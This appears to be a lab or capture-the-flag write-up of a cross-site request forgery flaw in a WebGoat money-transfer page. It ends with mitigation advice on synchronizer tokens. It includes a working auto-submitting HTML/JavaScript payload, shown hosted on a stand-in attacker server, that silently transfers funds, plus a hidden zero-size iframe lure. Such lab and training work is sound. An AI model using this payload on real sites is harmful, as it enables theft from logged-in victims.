## Vulnerability:

Money transferring mechanism on this site is vulnerable to CSRF attacks.

CSRF takes advantage of the inherent statelessness of the web to simulate user actions on one website (the target site) from another website (the attacking site).

## Exploitation:

Actual attack would consist of 2 following steps:

1) Preparing malicious HTML/JavaScript site that performs silent money transfer & hosting it somewhere. For example: CSRF html file on attacker's server (http://attack.example.com/csrf.html):

```
<html>
<script>

function sendMeMoney() {
var accountNo = 123;
var balance = 999;
var url = 'http://webgoat.hacking-lab.com/attack?Screen=68&menu=400&from=ajax&newAccount='+ accountNo+ '&amount=' + balance +'&confirm=Transferring';
if (typeof XMLHttpRequest != 'undefined') {
req = new XMLHttpRequest();
} else if (window.ActiveXObject) {
req = new ActiveXObject('Microsoft.XMLHTTP');
}
req.open('GET', url, true);
req.send(null);
}

</script>
<body onload='sendMeMoney();'>

</body>
</html>
```

This site will automatically (when loaded) transfer 999 to attacker's account number (123)


2) Enticing owner of the bank account (social engineering, phising, etc.) to visit site which has reference to csrf.html (for example: `<iframe width="0" height="0" src="http://attack.example.com/csrf.html">`) while logged in to his bank account. This would result in silent transfer of 999$ to attacker's bank account (123).

## Mitigation:

Classical defense against CRSF is using synchronizer token pattern (
http://www.corej2eepatterns.com/Design/PresoDesign.htm). Implementations of which exists for Java (https://www.owasp.org/index.php/Category:OWASP_CSRFGuard_Project) and PHP
(https://www.owasp.org/index.php/CSRFProtector_Project) applications.
